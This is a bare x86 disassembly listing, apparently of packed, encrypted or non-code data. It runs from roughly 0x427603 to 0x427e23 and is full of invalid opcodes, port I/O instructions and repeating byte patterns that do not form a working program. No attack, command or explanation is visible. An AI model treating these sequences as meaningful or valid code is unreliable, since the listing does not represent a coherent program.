  427603:	push   DWORD PTR [edx-0x7f7b88b0]
  427609:	ja     0x427596
  42760b:	adc    bh,0x8b
  42760e:	xor    BYTE PTR [edi-0x75],0x80
  427612:	lock mov edx,DWORD PTR [ebx+0x4b]
  427616:	push   ebx
  427617:	je     0x4275cb
  427619:	mov    BYTE PTR [edx+esi*4],cl
  42761c:	test   BYTE PTR [ecx],ch
  42761e:	push   DWORD PTR [edx]
  427620:	in     al,dx
  427621:	xlat   BYTE PTR ds:[ebx]
  427622:	data16 xor BYTE PTR [edi+0x7a],0x53
  427627:	sub    ch,ch
  427629:	mov    edx,0x8a84ed8a
  42762e:	mov    dl,0x88
  427630:	sub    esp,ebp
  427632:	std    
  427633:	inc    DWORD PTR ds:0x24f60ba2
  427639:	outs   dx,DWORD PTR ds:[esi]
  42763a:	cmp    BYTE PTR [eax-0xf7f7589],al
  427640:	mov    dl,BYTE PTR [ebx+0x11]
  427643:	push   ebx
  427644:	jl     0x4275f8
  427646:	mov    edx,0xc86b229
  42764b:	push   DWORD PTR [edx+0x6384f080]
  427651:	std    
  427652:	or     DWORD PTR [edi],ecx
  427654:	pop    ds
  427655:	mov    cl,BYTE PTR [ebp+0x4d]
  427658:	xor    BYTE PTR [edi-0x76],0x80
  42765c:	lock mov dl,BYTE PTR [ebx+0x7c]
  427660:	push   ebx
  427661:	adc    DWORD PTR [edx-0x794dd646],esi
  427667:	or     al,0xff
  427669:	mov    dl,0x80
  42766b:	lock test BYTE PTR [ebx-0x3],ah
  42766f:	xlat   BYTE PTR ds:[ebx]
  427670:	sbb    eax,DWORD PTR [eax-0xf7f7489]
  427676:	mov    edx,DWORD PTR [ebx+0x7c]
  427679:	push   ebx
  42767a:	adc    DWORD PTR [edx-0x454df37a],esi
  427680:	sub    edi,edi
  427682:	mov    dl,0xbe
  427684:	jg     0x4276c0
  427686:	lea    ecx,[ebp-0x6656da1e]
  42768c:	dec    ebp
  42768d:	xlat   BYTE PTR ds:[ebx]
  42768e:	add    BYTE PTR [ecx],0x77
  427691:	push   ss
  427692:	or     al,BYTE PTR [esi+0x4d4da00c]
  427698:	xor    BYTE PTR [edi-0x76],0x80
  42769c:	lock mov dl,BYTE PTR [ebx+0x7c]
  4276a0:	push   ebx
  4276a1:	adc    DWORD PTR [edx-0x794dd646],esi
  4276a7:	or     al,0xff
  4276a9:	mov    dl,0x80
  4276ab:	lock and DWORD PTR [ebx-0x4e],0xffffffd5
  4276b0:	xchg   ebx,eax
  4276b1:	xor    BYTE PTR [edi-0x75],0x80
  4276b5:	lock mov edx,DWORD PTR [ebx+0x7c]
  4276b9:	push   ebx
  4276ba:	adc    DWORD PTR [edx-0x794dd646],esi
  4276c0:	or     al,0xff
  4276c2:	mov    dl,0x80
  4276c4:	lock and DWORD PTR [ebx-0x4e],0xffffffd5
  4276c9:	daa    
  4276ca:	xor    BYTE PTR [edi-0x75],0x80
  4276ce:	lock mov edx,DWORD PTR [ebx+0x7c]
  4276d2:	push   ebx
  4276d3:	adc    DWORD PTR [edx-0x454df37a],esi
  4276d9:	sub    edi,edi
  4276db:	mov    dl,0xa
  4276dd:	cdq    
  4276de:	add    DWORD PTR [edi+0x16],esi
  4276e1:	or     al,BYTE PTR [esi+0x4d4d8b34]
  4276e7:	xor    BYTE PTR [edi-0x76],0x80
  4276eb:	lock mov dl,BYTE PTR [ebx+0x7c]
  4276ef:	push   ebx
  4276f0:	adc    DWORD PTR [edx-0x454df37a],esi
  4276f6:	sub    edi,edi
  4276f8:	mov    dl,0xa
  4276fa:	cdq    
  4276fb:	add    DWORD PTR [edi+0x16],esi
  4276fe:	or     al,BYTE PTR [esi+0x4d4d8b4c]
  427704:	xor    BYTE PTR [edi-0x7e],0xec
  427708:	cld    
  427709:	push   eax
  42770a:	ja     0x427721
  42770c:	dec    ebp
  42770d:	xlat   BYTE PTR ds:[ebx]
  42770e:	ds dec ebp
  427710:	xlat   BYTE PTR ds:[ebx]
  427711:	adc    eax,0xec367780
  427716:	ja     0x427707
  427718:	or     al,BYTE PTR [esi+0x4d4d82e5]
  42771e:	xor    BYTE PTR [edi-0x76],0x80
  427722:	lock mov dl,BYTE PTR [ebx+0x7c]
  427726:	push   ebx
  427727:	adc    DWORD PTR [edx-0x794dd646],esi
  42772d:	or     al,0xff
  42772f:	mov    dl,0x80
  427731:	lock and DWORD PTR [ebx-0x4e],0xffffffd5
  427736:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427737:	xor    BYTE PTR [edi-0x75],0x80
  42773b:	lock mov edx,DWORD PTR [ebx+0x7c]
  42773f:	push   ebx
  427740:	adc    DWORD PTR [edx-0x794dd646],esi
  427746:	or     al,0xff
  427748:	mov    dl,0x80
  42774a:	lock and DWORD PTR [ebx-0x4e],0xffffffd5
  42774f:	rol    BYTE PTR [eax-0xf7f7489],0x8b
  427756:	push   ebx
  427757:	jl     0x42770b
  427759:	xchg   BYTE PTR [ebx+edx*2],cl
  42775c:	adc    DWORD PTR [edx-0x4d00d646],esi
  427762:	or     cl,BYTE PTR [ebp-0x29]
  427765:	xor    BYTE PTR ds:[edi+0x36],0xec
  42776a:	ja     0x42775b
  42776c:	or     al,BYTE PTR [esi+0x4d4d8b1d]
  427772:	xor    BYTE PTR [edi-0x76],0x80
  427776:	lock mov dl,BYTE PTR [ebx+0x7c]
  42777a:	mov    dl,0x86
  42777c:	or     al,0x53
  42777e:	adc    DWORD PTR [edx-0x4d00d646],esi
  427784:	or     cl,BYTE PTR [ebp-0x29]
  427787:	xor    BYTE PTR ds:[edi+0x36],0xec
  42778c:	ja     0x42777d
  42778e:	or     al,BYTE PTR [esi+0x4d4d4b0b]
  427794:	xor    al,0x46
  427797:	xor    BYTE PTR [edi+0x46],0x53
  42779b:	je     0x4277f0
  42779d:	sub    dh,BYTE PTR [edx-0x7b4df342]
  4277a3:	sub    edi,edi
  4277a5:	mov    dl,0x80
  4277a7:	lock cs push ebx
  4277aa:	mov    dl,0x40
  4277ac:	lea    edi,[edx]
  4277ae:	lea    ecx,[ebp-0x72c8ea2b]
  4277b4:	int    0x8d
  4277b6:	lea    ecx,[edx]
  4277b8:	dec    ebp
  4277b9:	xlat   BYTE PTR ds:[ebx]
  4277ba:	ds adc bh,0x36
  4277be:	in     al,dx
  4277bf:	xlat   BYTE PTR ds:[ebx]
  4277c0:	out    dx,eax
  4277c1:	xchg   BYTE PTR [esi-0x7fb2b258],bl
  4277c7:	ja     0x42783a
  4277c9:	xor    al,0x3e
  4277cc:	cmp    ch,bh
  4277ce:	xor    BYTE PTR [edi+0x3e],0xec
  4277d2:	ja     0x42775a
  4277d4:	push   eax
  4277d5:	ja     0x42775d
  4277d7:	xor    BYTE PTR [edi-0x75],0x80
  4277db:	lock mov edx,DWORD PTR [ebx+0x11]
  4277df:	mov    dl,0xba
  4277e1:	sub    DWORD PTR [ebx+0x7c],edx
  4277e4:	mov    dl,0x86
  4277e6:	or     al,0xff
  4277e8:	mov    dl,0x80
  4277ea:	lock xchg BYTE PTR [ecx],cl
  4277ed:	and    dh,BYTE PTR [edx-0x7f750f80]
  4277f3:	xchg   edi,eax
  4277f4:	mov    dl,BYTE PTR [ebx+0x2a]
  4277f7:	push   ebx
  4277f8:	xchg   esp,eax
  4277f9:	mov    dl,0xbe
  4277fb:	or     al,0xb2
  4277fd:	clc    
  4277fe:	sub    edi,edi
  427800:	(bad)  
  427801:	in     al,dx
  427802:	lock mul DWORD PTR [ebx-0x4e]
  427806:	or     edx,ebp
  427808:	hlt    
  427809:	retf   
  42780a:	dec    ebp
  42780b:	dec    ebp
  42780c:	xor    BYTE PTR [edi-0x11],0xab
  427810:	test   eax,0x71fb70a3
  427815:	lea    edx,[edi-0x78127880]
  42781b:	adc    eax,0x539b9993
  427820:	push   0xffffff80
  427822:	ja     0x427859
  427824:	or     ch,0x2e
  427827:	cmp    cl,BYTE PTR [ebp-0x10687f73]
  42782d:	or     BYTE PTR [ebp-0x7fde2880],0xe7
  427834:	out    dx,eax
  427835:	and    BYTE PTR [edi-0x7588afdf],0x60
  42783c:	fistp  DWORD PTR [eax-0x21]
  42783f:	adc    DWORD PTR [ebx-0x4a],edx
  427842:	pop    esi
  427843:	xchg   BYTE PTR [edi+0x32532643],cl
  427849:	or     DWORD PTR [esi-0x3e],eax
  42784c:	or     al,0xb2
  42784e:	mov    esp,0x8d4ba229
  427853:	lea    ecx,[ebp+0xc88b2cd]
  427859:	push   ebx
  42785a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42785b:	dec    DWORD PTR [ebx-0x80]
  42785e:	out    0x1d,eax
  427860:	call   DWORD PTR [ebx+eiz*2+0x6313d79c]
  427867:	(bad)  
  427868:	xlat   BYTE PTR ds:[ebx]
  427869:	or     DWORD PTR [edx-0x54881f31],esp
  42786f:	push   esi
  427870:	sar    ebx,cl
  427872:	adc    al,0x62
  427874:	mov    esi,0x8d8d3a9c
  427879:	adc    BYTE PTR [edi+0x15d78071],0x80
  427880:	xchg   edi,eax
  427881:	out    dx,eax
  427882:	adc    bh,0x21
  427885:	adc    BYTE PTR [edi+0x21d780ef],0x80
  42788c:	out    0xef,eax
  42788e:	and    BYTE PTR [edi+0x53325321],0xb6
  427895:	or     DWORD PTR [esi-0x3e],eax
  427898:	or     al,0xb2
  42789a:	mov    esp,0x8d4ba229
  42789f:	lea    ecx,[ebp-0x5bac33]
  4278a5:	xchg   esp,eax
  4278a6:	mov    dl,0x88
  4278a8:	or     al,0xff
  4278aa:	dec    ebx
  4278ab:	and    bh,0x71
  4278ae:	and    BYTE PTR [edi-0x7f7daceb],0x77
  4278b5:	jno    0x42790a
  4278b7:	retf   
  4278b8:	xor    al,0x15
  4278bb:	or     DWORD PTR [esi-0x54],eax
  4278be:	or     al,0xb2
  4278c0:	test   BYTE PTR [ecx],ch
  4278c2:	push   ebx
  4278c3:	jo     0x4278c4
  4278c5:	retf   
  4278c6:	push   edi
  4278c7:	lea    ecx,[ebp-0x3b4d3273]
  4278cd:	or     al,0xff
  4278cf:	add    BYTE PTR [eax-0x63131089],0x13
  4278d6:	mov    BYTE PTR [eax+0x21d78051],0x80
  4278dd:	out    0x71,eax
  4278df:	and    BYTE PTR [edi-0x757b12eb],0xed
  4278e6:	mov    esp,0x29beb28a
  4278eb:	push   ebx
  4278ec:	jb     0x427945
  4278ee:	aad    0x58
  4278f0:	fist   WORD PTR [ecx]
  4278f2:	mov    ds:0x438f860b,al
  4278f7:	mov    es:0xdf58d54b,al
  4278fd:	adc    DWORD PTR [edx+0x438f86c6],esp
  427903:	es in  al,dx
  427905:	jl     0x42791a
  427907:	(bad)  
  427908:	(bad)  
  427909:	std    
  42790a:	(bad)  
  42790b:	jle    0x42796b
  42790d:	xchg   BYTE PTR [edi+0x5a22643],cl
  427913:	fstp   DWORD PTR [eax-0x21]
  427916:	adc    DWORD PTR [ebx-0x9],edx
  427919:	mov    ds:0xdf58e8cb,al
  42791e:	adc    edi,edx
  427920:	adc    esp,DWORD PTR [ebx-0x9]
  427923:	xlat   BYTE PTR ds:[ebx]
  427924:	or     DWORD PTR [edx+0x3ca10d57],esp
  42792a:	(bad)  
  42792c:	loope  0x427942
  42792e:	enter  0x25be,0x3a
  427932:	lea    ecx,[ebp-0x7f106880]
  427938:	xlat   BYTE PTR ds:[ebx]
  427939:	and    DWORD PTR [eax-0x187f1059],eax
  42793f:	and    DWORD PTR [ebx+0x32],edx
  427942:	pusha  
  427943:	fistp  DWORD PTR [eax-0x21]
  427946:	adc    DWORD PTR [ebx-0x4a],edx
  427949:	or     DWORD PTR [esi-0x3e],eax
  42794c:	or     al,0xb2
  42794e:	mov    BYTE PTR [ebx+edx*2],cl
  427951:	dec    ebp
  427952:	mov    dl,0xb4
  427954:	sub    DWORD PTR [eax-0x29],edx
  427957:	enter  0x9cff,0x80
  42795b:	out    0xc8,eax
  42795d:	cli    
  42795e:	lea    ecx,[ebp+0x453cd8d]
  427964:	inc    DWORD PTR [esi]
  427966:	and    BYTE PTR [edi+0x50238025],0xa7
  42796d:	xor    ah,BYTE PTR [ebx+0x3]
  427970:	xlat   BYTE PTR ds:[ebx]
  427971:	outs   dx,DWORD PTR ds:[esi]
  427972:	push   ebx
  427973:	jb     0x4279d8
  427975:	pushf  
  427976:	aad    0xb0
  427978:	dec    ebp
  427979:	xlat   BYTE PTR ds:[ebx]
  42797a:	xor    eax,0x4d25d780
  42797f:	xlat   BYTE PTR ds:[ebx]
  427980:	sub    eax,0x4d8ad74d
  427985:	pop    ecx
  427986:	xchg   BYTE PTR [ebx],dh
  427988:	dec    ebx
  427989:	dec    ebp
  42798a:	dec    ebp
  42798b:	push   eax
  42798c:	outs   dx,DWORD PTR ds:[esi]
  42798d:	mov    esi,0x8d8d8dfa
  427992:	adc    BYTE PTR [edi+0x21e780ef],0x53
  427999:	mov    edx,DWORD PTR [ebx-0x4a]
  42799c:	or     DWORD PTR [esi-0x7b],eax
  42799f:	or     al,0xb2
  4279a1:	popa   
  4279a2:	or     al,0x50
  4279a4:	out    0xc8,eax
  4279a6:	and    bh,0xef
  4279a9:	and    BYTE PTR [edi+0x29bcb221],0x53
  4279b0:	or     eax,0x53c8d780
  4279b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4279b6:	dec    DWORD PTR [ebx-0x80]
  4279b9:	out    0x71,eax
  4279bb:	push   ebx
  4279bc:	retf   
  4279bd:	call   DWORD PTR [eax+eax*4-0x7dacea59]
  4279c4:	cmp    BYTE PTR [eax+eax*4-0x19],0x71
  4279c9:	adc    BYTE PTR [ecx],0x80
  4279cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4279cd:	adc    eax,0xcfd4609
  4279d2:	mov    dl,0xbc
  4279d4:	sub    DWORD PTR [ebx-0x5c],edx
  4279d7:	mov    dl,0xbe
  4279d9:	or     al,0xa2
  4279db:	dec    ebx
  4279dc:	lea    ecx,[ebp+0x74ffcd8d]
  4279e2:	jmp    FWORD PTR [edx]
  4279e4:	arpl   di,si
  4279e6:	xlat   BYTE PTR ds:[ebx]
  4279e7:	sbb    DWORD PTR [ebx+0x5],esp
  4279ea:	xlat   BYTE PTR ds:[ebx]
  4279eb:	nop
  4279ec:	dec    edx
  4279ed:	push   ebx
  4279ee:	test   DWORD PTR [esi],ebx
  4279f0:	jne    0x4279b1
  4279f2:	push   0xffffffc8
  4279f4:	outs   dx,DWORD PTR ds:[esi]
  4279f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4279f6:	jbe    0x427a2c
  4279f8:	push   ebx
  4279f9:	test   DWORD PTR [esi],ebx
  4279fb:	jne    0x4279c1
  4279fd:	stos   BYTE PTR es:[edi],al
  4279fe:	xor    BYTE PTR [edi-0x11],0x80
  427a02:	lock and DWORD PTR [eax-0x287f1069],eax
  427a09:	and    DWORD PTR [edx+0x438f8605],esp
  427a0f:	es push edi
  427a11:	fistp  DWORD PTR [eax-0x21]
  427a14:	adc    DWORD PTR [ecx],ecx
  427a16:	inc    esi
  427a17:	std    
  427a18:	or     al,0x80
  427a1a:	ret    0x4d53
  427a1d:	push   ebx
  427a1e:	jb     0x4279d2
  427a20:	add    ch,BYTE PTR [ecx]
  427a22:	push   ebx
  427a23:	test   DWORD PTR [edx+0xba20cbe],esi
  427a29:	lea    ecx,[ebp+0x7cffcd8d]
  427a2f:	call   DWORD PTR [ecx+0x5f]
  427a32:	ja     0x4279be
  427a34:	xlat   BYTE PTR ds:[ebx]
  427a35:	out    dx,al
  427a36:	arpl   WORD PTR [esi+0x47a221d5],si
  427a3c:	fisubr WORD PTR [eax+0x2d]
  427a3f:	mov    ds:0xe3bb390a,al
  427a44:	les    esp,FWORD PTR [esi-0x5e2bc85e]
  427a4a:	adc    edx,ebp
  427a4c:	pop    esp
  427a4d:	js     0x427a73
  427a4f:	xor    ch,BYTE PTR [ebx-0x48f5c57]
  427a55:	sub    eax,0x8780978d
  427a5a:	in     eax,dx
  427a5b:	xchg   DWORD PTR [ecx],esp
  427a5d:	xor    BYTE PTR [edi-0x11],0x80
  427a61:	lock and DWORD PTR [ecx],ecx
  427a64:	inc    esi
  427a65:	std    
  427a66:	or     al,0xb2
  427a68:	mov    esi,0xeff0800c
  427a6d:	adc    BYTE PTR [edi-0x454d66df],0x29
  427a74:	xor    al,0x1d
  427a77:	cli    
  427a78:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427a79:	mov    DWORD PTR [esp+edx*8],0x7253fc53
  427a80:	(bad)  
  427a81:	sti    
  427a82:	push   eax
  427a83:	cmp    al,BYTE PTR [eax-0x327fda89]
  427a89:	cmp    cl,BYTE PTR ss:[ebp-0x7f107f73]
  427a90:	ja     0x427ab7
  427a92:	or     ch,0x36
  427a95:	cmp    cl,BYTE PTR [ebp-0x13727f73]
  427a9b:	xchg   edx,eax
  427a9c:	gs xor al,0x25
  427aa0:	adc    BYTE PTR [eax+0x32],0x3a
  427aa4:	lea    ecx,[ebp-0x1dea8080]
  427aaa:	out    dx,al
  427aab:	mov    ebp,0x8d8d818d
  427ab0:	dec    ebp
  427ab1:	push   edx
  427ab2:	or     ch,BYTE PTR [edx-0x73af49b3]
  427ab8:	xor    BYTE PTR [edi-0x11],0x80
  427abc:	lock and DWORD PTR [ecx],ecx
  427abf:	inc    esi
  427ac0:	std    
  427ac1:	or     al,0xb2
  427ac3:	mov    esi,0xeff0800c
  427ac8:	adc    BYTE PTR [edi+0x25d74d21],0x53
  427acf:	cld    
  427ad0:	push   ebx
  427ad1:	jb     0x427ad2
  427ad3:	sti    
  427ad4:	push   eax
  427ad5:	ja     0x427a61
  427ad7:	add    DWORD PTR [edi-0x76],esi
  427ada:	or     bl,BYTE PTR [ebx-0x4de228b3]
  427ae0:	mov    edx,0x15d74d29
  427ae5:	dec    ebp
  427ae6:	xlat   BYTE PTR ds:[ebx]
  427ae7:	jno    0x427b36
  427ae9:	xlat   BYTE PTR ds:[ebx]
  427aea:	and    DWORD PTR [ebp-0x29],ecx
  427aed:	out    dx,eax
  427aee:	xchg   BYTE PTR [ebx],dh
  427af0:	int3   
  427af1:	dec    ebp
  427af2:	dec    ebp
  427af3:	xor    BYTE PTR [edi-0x11],0x80
  427af7:	lock and DWORD PTR [ecx],ecx
  427afa:	inc    esi
  427afb:	std    
  427afc:	or     al,0xb2
  427afe:	mov    esi,0xeff0800c
  427b03:	adc    BYTE PTR [edi+0x53fc5321],0x72
  427b0a:	mov    dl,0xba
  427b0c:	sub    DWORD PTR [eax+0x63fbff09],eax
  427b12:	std    
  427b13:	aad    0x37
  427b15:	xor    BYTE PTR [edi+0x71],0x80
  427b19:	lock adc eax,0xcfd4609
  427b1f:	mov    dl,0xbe
  427b21:	or     al,0x80
  427b23:	lock jno 0x427aa6
  427b26:	xchg   edi,eax
  427b27:	adc    eax,0x7253fc53
  427b2c:	mov    dl,0xba
  427b2e:	sub    DWORD PTR [eax-0x400e210],eax
  427b34:	or     DWORD PTR [edx],esp
  427b36:	ja     0x427ac2
  427b38:	push   eax
  427b39:	cmp    ch,BYTE PTR [ecx-0x72e20490]
  427b3f:	xchg   edi,eax
  427b40:	add    BYTE PTR [edi-0x64666c6a],0x53
  427b47:	push   0xffffff80
  427b49:	xlat   BYTE PTR ds:[ebx]
  427b4a:	cmp    eax,0x80459780
  427b4f:	out    0x25,eax
  427b51:	pop    esi
  427b52:	xchg   BYTE PTR [edi-0x249fd9bd],cl
  427b58:	pop    eax
  427b59:	fist   WORD PTR [ecx]
  427b5b:	arpl   di,si
  427b5d:	or     esi,ecx
  427b5f:	dec    esp
  427b60:	lea    ecx,[ebp-0x3960fe73]
  427b66:	in     al,0xee
  427b68:	arpl   si,ax
  427b6a:	(bad)  
  427b6c:	arpl   si,ax
  427b6e:	xlat   BYTE PTR ds:[ebx]
  427b6f:	out    dx,eax
  427b70:	arpl   di,si
  427b72:	or     DWORD PTR [edi],ecx
  427b74:	pop    ss
  427b75:	or     al,0x8d
  427b77:	lea    esp,[edx-0x20a755f3]
  427b7d:	adc    edi,edx
  427b7f:	out    dx,eax
  427b80:	arpl   di,si
  427b82:	or     DWORD PTR [edi],ecx
  427b84:	das    
  427b85:	or     al,0x8d
  427b87:	lea    esp,[edx-0x20a766f3]
  427b8d:	adc    edi,edx
  427b8f:	out    dx,eax
  427b90:	arpl   di,si
  427b92:	or     DWORD PTR [edi],ecx
  427b94:	dec    ebx
  427b95:	lea    ecx,[ebp-0x56f25d73]
  427b9b:	pop    eax
  427b9c:	fist   WORD PTR [ecx]
  427b9e:	xlat   BYTE PTR ds:[ebx]
  427b9f:	out    dx,al
  427ba0:	arpl   di,si
  427ba2:	aad    0x3f
  427ba4:	mov    ds:0xdf58d00d,al
  427ba9:	adc    edi,edx
  427bab:	out    dx,eax
  427bac:	arpl   di,si
  427bae:	or     DWORD PTR [edi],ecx
  427bb0:	mov    al,ds:0xa28d8d3a
  427bb5:	or     eax,0x11df58b9
  427bba:	or     DWORD PTR [edi-0x24],ecx
  427bbd:	cmp    cl,BYTE PTR [ebp+0x9f7638d]
  427bc3:	(bad)  
  427bc5:	lea    ecx,[ebp+0x3aa2be8d]
  427bcb:	lea    ecx,[ebp+0x4d1dd74d]
  427bd1:	xlat   BYTE PTR ds:[ebx]
  427bd2:	sub    eax,0x4d15d74d
  427bd7:	xlat   BYTE PTR ds:[ebx]
  427bd8:	jno    0x427c27
  427bda:	xlat   BYTE PTR ds:[ebx]
  427bdb:	and    DWORD PTR [ebp-0x29],ecx
  427bde:	out    dx,eax
  427bdf:	xchg   bl,dl
  427be1:	or     eax,0xb7be4d4d
  427be6:	cmp    cl,BYTE PTR [ebp-0x3ef25d73]
  427bec:	pop    eax
  427bed:	fist   WORD PTR [ecx]
  427bef:	xlat   BYTE PTR ds:[ebx]
  427bf0:	out    dx,eax
  427bf1:	arpl   di,si
  427bf3:	or     DWORD PTR [edi],ecx
  427bf5:	loope  0x427b84
  427bf7:	lea    ecx,[ebp+0x58e40da2]
  427bfd:	fist   WORD PTR [ecx]
  427bff:	xlat   BYTE PTR ds:[ebx]
  427c00:	out    dx,eax
  427c01:	arpl   di,si
  427c03:	or     DWORD PTR [edi],ecx
  427c05:	mov    cl,0x3a
  427c07:	lea    ecx,[ebp+0x58d90da2]
  427c0d:	fist   WORD PTR [ecx]
  427c0f:	xlat   BYTE PTR ds:[ebx]
  427c10:	out    dx,al
  427c11:	arpl   di,si
  427c13:	aad    0x1d
  427c15:	mov    ds:0xdf58e60d,al
  427c1a:	adc    edi,edx
  427c1c:	out    dx,eax
  427c1d:	arpl   di,si
  427c1f:	or     DWORD PTR [edi],ecx
  427c21:	aam    0x3a
  427c23:	lea    ecx,[ebp+0x58e80da2]
  427c29:	fist   WORD PTR [ecx]
  427c2b:	les    eax,FWORD PTR [ecx]
  427c2d:	adc    BYTE PTR [edi+0x21d780ef],0x80
  427c34:	out    0xef,eax
  427c36:	and    BYTE PTR [edi+0x53325321],0xb6
  427c3d:	or     DWORD PTR [esi-0x3e],eax
  427c40:	or     al,0xb2
  427c42:	mov    esp,0x8d4ba229
  427c47:	lea    ecx,[ebp+0xc88b2cd]
  427c4d:	push   ebx
  427c4e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427c4f:	dec    DWORD PTR [ebx-0x80]
  427c52:	out    0xef,eax
  427c54:	call   DWORD PTR [eax+eax*4-0x6313de59]
  427c5b:	adc    eax,esi
  427c5d:	push   eax
  427c5e:	xchg   edi,eax
  427c5f:	out    dx,eax
  427c60:	push   eax
  427c61:	xlat   BYTE PTR ds:[ebx]
  427c62:	and    DWORD PTR [eax-0x287f1069],eax
  427c68:	and    DWORD PTR [eax-0x587f1019],eax
  427c6e:	and    DWORD PTR [ebx+0x32],edx
  427c71:	push   ebx
  427c72:	mov    dh,0x9
  427c74:	inc    esi
  427c75:	ret    0xb20c
  427c78:	mov    esp,0xb2a45329
  427c7d:	mov    BYTE PTR [edx+eiz*4],cl
  427c80:	dec    ebx
  427c81:	lea    ecx,[ebp-0x6b003273]
  427c87:	dec    DWORD PTR [ebx+0x3f]
  427c8a:	xchg   edi,eax
  427c8b:	jno    0x427cac
  427c8d:	xlat   BYTE PTR ds:[ebx]
  427c8e:	adc    eax,0x803d9780
  427c93:	xlat   BYTE PTR ds:[ebx]
  427c94:	inc    ebp
  427c95:	adc    BYTE PTR [edi+0x15d78071],0x80
  427c9c:	xchg   edi,eax
  427c9d:	jno    0x427c1f
  427c9f:	xlat   BYTE PTR ds:[ebx]
  427ca0:	adc    eax,0x8071e780
  427ca5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427ca6:	adc    eax,0xb6533253
  427cab:	or     DWORD PTR [esi-0x3e],eax
  427cae:	or     al,0xb2
  427cb0:	mov    esp,0xa2a45329
  427cb5:	dec    ebx
  427cb6:	lea    ecx,[ebp-0x774d3273]
  427cbc:	or     al,0xff
  427cbe:	dec    ebx
  427cbf:	and    bh,0x3d
  427cc2:	call   DWORD PTR [eax+eax*4-0x34acba59]
  427cc9:	push   ebx
  427cca:	add    BYTE PTR [eax-0xf7fc289],0x45
  427cd1:	or     DWORD PTR [esi-0x54],eax
  427cd4:	or     al,0x53
  427cd6:	jo     0x427c8a
  427cd8:	test   BYTE PTR [ecx],ch
  427cda:	push   edi
  427cdb:	lea    ecx,[ebp-0x34003273]
  427ce1:	xor    al,0x71
  427ce4:	mov    dl,0xc4
  427ce6:	or     al,0xff
  427ce8:	sub    ah,0x9c
  427ceb:	adc    BYTE PTR [edi-0x1239eceb],0xba
  427cf2:	mov    dh,BYTE PTR [edx+0x6a532988]
  427cf8:	mov    ds:0xdf58d505,al
  427cfd:	adc    DWORD PTR [edx+0x438f86c2],esp
  427d03:	es and bh,0x3d
  427d07:	and    BYTE PTR [edi-0x754312bb],0xa2
  427d0e:	dec    ebx
  427d0f:	aad    0x58
  427d11:	fist   WORD PTR [ecx]
  427d13:	mov    ds:0x438f86c6,al
  427d18:	es in  al,dx
  427d1a:	sub    al,BYTE PTR [eax-0x6becda19]
  427d20:	(bad)  
  427d21:	sti    
  427d22:	push   edi
  427d23:	xchg   BYTE PTR [edi-0xf5d9bd],cl
  427d29:	add    eax,0x58d90ba2
  427d2e:	fist   WORD PTR [ecx]
  427d30:	cdq    
  427d31:	dec    ebp
  427d32:	xlat   BYTE PTR ds:[ebx]
  427d33:	xor    eax,0x9b2dd74d
  427d38:	dec    ebp
  427d39:	xlat   BYTE PTR ds:[ebx]
  427d3a:	sbb    eax,0x4d15d74d
  427d3f:	xlat   BYTE PTR ds:[ebx]
  427d40:	jno    0x427d8f
  427d42:	xlat   BYTE PTR ds:[ebx]
  427d43:	and    DWORD PTR [ebp-0x29],ecx
  427d46:	out    dx,eax
  427d47:	xchg   dh,al
  427d49:	int3   
  427d4a:	dec    ebp
  427d4b:	dec    ebp
  427d4c:	push   eax
  427d4d:	mov    WORD PTR [eax-0x5c565474],es
  427d53:	jo     0x427d50
  427d55:	cmp    eax,0xef97808d
  427d5a:	adc    bh,0x21
  427d5d:	and    bh,0xef
  427d60:	and    BYTE PTR [edi+0x53b65321],0x32
  427d67:	or     DWORD PTR [esi-0x3e],eax
  427d6a:	or     al,0xb2
  427d6c:	mov    esp,0x8d4ba229
  427d71:	lea    ecx,[ebp+0xc88b2cd]
  427d77:	push   ebx
  427d78:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427d79:	call   DWORD PTR [edi+edi*8+0x71e7804b]
  427d80:	and    BYTE PTR [edi-0x6300eb],0xc6
  427d87:	push   eax
  427d88:	xchg   edi,eax
  427d89:	jno    0x427ddb
  427d8b:	xlat   BYTE PTR ds:[ebx]
  427d8c:	adc    eax,0x803d9780
  427d91:	xlat   BYTE PTR ds:[ebx]
  427d92:	inc    ebp
  427d93:	adc    BYTE PTR [edi+0x15d78071],0x80
  427d9a:	xchg   edi,eax
  427d9b:	out    dx,eax
  427d9c:	adc    bh,0x21
  427d9f:	adc    BYTE PTR [edi+0x21d780ef],0x80
  427da6:	out    0xef,eax
  427da8:	and    BYTE PTR [edi+0x53b65321],0x32
  427daf:	or     DWORD PTR [esi-0x3e],eax
  427db2:	or     al,0xb2
  427db4:	mov    esp,0x8d4ba229
  427db9:	lea    ecx,[ebp-0x5bac33]
  427dbf:	xchg   esp,eax
  427dc0:	mov    dl,0x88
  427dc2:	or     al,0xff
  427dc4:	dec    ebx
  427dc5:	and    bh,0x71
  427dc8:	and    BYTE PTR [edi+0x53cb5315],0x82
  427dcf:	xor    BYTE PTR [edi+0x71],0x80
  427dd3:	lock adc eax,0xcac4609
  427dd9:	push   ebx
  427dda:	jo     0x427ddb
  427ddc:	retf   
  427ddd:	mov    dl,0x84
  427ddf:	sub    DWORD PTR [edi-0x73],edx
  427de2:	lea    ecx,[ebp+0xcc4b2cd]
  427de8:	inc    DWORD PTR [edx-0x7fc28880]
  427dee:	lock inc ebp
  427df0:	in     al,dx
  427df1:	pushf  
  427df2:	and    bh,0x3d
  427df5:	adc    eax,esi
  427df7:	and    BYTE PTR [edi-0x79fa5dbb],0x8f
  427dfe:	inc    ebx
  427dff:	es push edi
  427e01:	fistp  DWORD PTR [eax-0x21]
  427e04:	adc    DWORD PTR [ecx],ecx
  427e06:	inc    esi
  427e07:	std    
  427e08:	or     al,0xb2
  427e0a:	mov    esp,0xcbeb229
  427e0f:	push   ebx
  427e10:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427e11:	mov    ds:0x8d8d8d4b,al
  427e16:	int    0xff
  427e18:	sub    bh,bh
  427e1a:	je     0x427e08
  427e1c:	not    DWORD PTR [ebx]
  427e1e:	add    eax,0x80eff080
  427e23:	xchg   edi,eax
